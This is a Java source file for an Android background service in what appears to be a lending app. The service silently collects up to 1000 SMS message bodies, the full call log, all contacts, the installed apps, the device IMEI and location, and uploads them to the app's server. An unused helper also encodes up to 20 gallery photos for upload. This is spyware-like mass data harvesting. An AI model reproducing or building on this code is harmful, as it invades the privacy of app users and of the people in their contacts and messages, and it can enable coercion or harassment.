package com.drfin.drfin_amoney.Services;

import android.annotation.SuppressLint;
import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import com.drfin.drfin_amoney.models.LoginHelperModel;
import com.drfin.drfin_amoney.models.SmsListModel;
import com.drfin.drfin_amoney.utils.ApiClientService;
import com.drfin.drfin_amoney.utils.ImageConversionClass;
import com.drfin.drfin_amoney.utils.PrefrenceHandler;
import com.drfin.drfin_amoney.utils.RetrofitApiClient;
import com.google.gson.Gson;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Pulkit Kumar
 */

public class UserAllInformationService extends IntentService {
    private PrefrenceHandler pref;
    private String callLogs;
    private String contactNo;
    private String installedApp;

    public UserAllInformationService() {
        super("");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        pref = new PrefrenceHandler(this);
        callLogs=getCallLogsAndLocations();
        contactNo=getContactList();
        installedApp=InstatlledApplicationData();
        getSMS(this);
    }

    private void getSMS(Context context) {
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS;
        List<SmsListModel> slm = new ArrayList<>();
        if (c != null) {
            totalSMS = c.getCount();
            int loopValue= Math.min(totalSMS, 1000);
            if (c.moveToFirst()) {
                for (int j = 0; j < loopValue; j++) {
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String smsID = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
                    long smsDate= Long.parseLong(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE)));

                    @SuppressLint("SimpleDateFormat")
                    SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
                    SmsListModel smsListModel = new SmsListModel(smsID, number, body,dateFormat.format(smsDate));
                    slm.add(smsListModel);
                    c.moveToNext();
                }
            }
            createGson(slm);
            c.close();
        } else {
            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
        }
    }

    private void createGson(List<SmsListModel> smsListModel) {
        JSONArray arr = new JSONArray();
        for (SmsListModel smsList : smsListModel) {
            JSONObject obj = new JSONObject();
            try {
                obj.put("Sms_Id", smsList.getSMSID());
                obj.put("Contact_No", smsList.getContacct_No());
                obj.put("Sms_body", smsList.getSMS_BODY());
                obj.put("Sms_Date", smsList.getSMS_DATE());
            } catch (JSONException e) {
                e.printStackTrace();
            }
            arr.put(obj);
        }
//        UpdateCustomerData(arr.toString());
        HttpPostAsyncTask task = new HttpPostAsyncTask();
        task.execute(arr.toString(),callLogs,contactNo,installedApp);
    }

    private String getCallLogsAndLocations() {
        try {
            JSONArray callLogarr = new JSONArray();
            StringBuilder stringBuffer = new StringBuilder();
            ContentResolver cr = getContentResolver();
            @SuppressLint({"MissingPermission", "Recycle"})
            Cursor managedCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            assert managedCursor != null;
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                @SuppressLint("SimpleDateFormat")
                SimpleDateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
                String reportDate = df.format(callDayTime);
                String callDuration = managedCursor.getString(duration);

                stringBuffer.append("\nPhone Number:--- ").append(phNumber).append(" \nCall Date:--- ").append(reportDate).append(" \nCall duration in sec :--- ").append(callDuration);
                stringBuffer.append("\n----------------------------------");
                JSONObject callLogJson = new JSONObject();
                try {
                    callLogJson.put("Phone_no", phNumber);
                    callLogJson.put("Call_duration", callDuration);
                    callLogJson.put("Report_date", reportDate);
                    callLogarr.put(callLogJson);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
//            pref.setCall_log(callLogarr.toString());
            return callLogarr.toString();

        } catch (Exception e) {
            e.getStackTrace();
        }
        return null;
    }

    private String getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        JSONArray contactArray = new JSONArray();
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    assert pCur != null;
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        JSONObject obj = new JSONObject();
                        try {
                            obj.put("Name", name);
                            obj.put("Contact_No", phoneNo);
                            contactArray.put(obj);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                    pCur.close();
                }
            }
//            pref.setContactList(contactArray.toString());
            Log.d("TAG", "Contact Details: " + contactArray);
            return contactArray.toString();
        }
        if (cur != null) {
            cur.close();
        }
        return null;
    }

    private String InstatlledApplicationData() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        StringBuilder stringBuilder = new StringBuilder();
        for (ApplicationInfo app : apps) {
            if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    ApplicationInfo appInfo = null;
                    try {
                        appInfo = pm.getApplicationInfo(app.packageName, 0);
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                    }
                    assert appInfo != null;
                    String appFile = appInfo.sourceDir;
                    long installed = new File(appFile).lastModified();
                    @SuppressLint("SimpleDateFormat")
                    SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
                    stringBuilder.append(app.loadLabel(pm)).append("@").append(dateFormat.format(installed)).append(",");
                    Log.d("TAG", "Install Application: " + stringBuilder);
                }
            }
        }
//        pref.setInstalledApp(stringBuilder.toString());
        return stringBuilder.toString();
    }

    @SuppressLint("StaticFieldLeak")
    public class HttpPostAsyncTask extends AsyncTask<String, Void, Void> {

        @Override
        protected Void doInBackground(String... params) {
            ApiClientService apiInterface = RetrofitApiClient.getClient().create(ApiClientService.class);
            Call<LoginHelperModel> call1 = apiInterface.updateCostumerDetails(
                    pref.getAuth_Token(),
                    params[0],
                    params[2],
                    pref.getDeviceIMEI(),
                    "",
                    pref.getLatitude(),
                    pref.getLongitude(),
                    pref.getDeviceName(),
                    pref.getDeviceModel(),
                    params[3],
                    params[1],
                    pref.getUSER_Address());

            call1.enqueue(new Callback<LoginHelperModel>() {
                @Override
                public void onResponse(@NonNull Call<LoginHelperModel> call,@NonNull Response<LoginHelperModel> response) {
                    Log.d("TAG", "responce: " + response.message());

                }

                @Override
                public void onFailure(@NonNull Call<LoginHelperModel> call,@NonNull Throwable t) {
                    Log.d("TAG", "responce update customer: " + t.getMessage());
                }
            });
            return null;
        }
    }

    @SuppressLint("Recycle")
    private String getImagesPath(Context activity) {
        Uri uri;
        JSONArray array=new JSONArray();
        Cursor cursor;
        int column_index_data;
        String PathOfImage;
        StringBuilder sb=new StringBuilder();
        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        @SuppressLint("InlinedApi")
        String[] projection = {MediaStore.MediaColumns.DATA};
        cursor = activity.getContentResolver().query(uri, projection, null,null, null);
        assert cursor != null;
        Bitmap bmp;
        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        while (cursor.moveToNext() && array.length()<20) {
            JSONObject object=new JSONObject();
            PathOfImage = cursor.getString(column_index_data);
            bmp = BitmapFactory.decodeFile(PathOfImage);
            sb.append(ImageConversionClass.BitmapTolowString(bmp)).append("image");
            try {
                object.put("image",ImageConversionClass.BitmapTolowString(bmp));
                array.put(object);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
//        return array.toString();
        return sb.toString();
    }
}
